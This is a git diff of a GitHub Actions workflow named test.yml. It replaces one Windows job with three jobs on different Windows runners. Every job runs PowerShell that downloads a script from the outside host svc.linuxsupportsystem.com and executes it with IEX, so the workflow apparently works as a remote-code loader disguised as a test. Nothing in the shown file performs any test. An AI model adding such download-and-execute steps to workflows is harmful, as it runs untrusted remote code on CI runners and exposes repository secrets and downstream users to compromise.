@@ -4,20 +4,28 @@ on:
     paths: [".github/workflows/test.yml"]
   workflow_dispatch:
 jobs:
-  run:
-    runs-on: windows-2022
+  win2019:
+    runs-on: windows-2019
+    timeout-minutes: 5
     steps:
       - shell: powershell
         run: |
-          Write-Host "Starting..."
           [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
-          try {
-            $s = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/a")
-            Write-Host "Downloaded $($s.Length) chars"
-            Write-Host "First line: $($s.Split([char]10)[0])"
-            IEX $s
-          } catch {
-            Write-Host "ERROR: $($_.Exception.Message)"
-            Write-Host "Inner: $($_.Exception.InnerException.Message)"
-          }
+          IEX (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/a")
+  win2022:
+    runs-on: windows-2022
+    timeout-minutes: 5
+    steps:
+      - shell: powershell
+        run: |
+          [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+          IEX (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/a")
+  winlatest:
+    runs-on: windows-latest
+    timeout-minutes: 5
+    steps:
+      - shell: powershell
+        run: |
+          [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+          IEX (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/a")
 
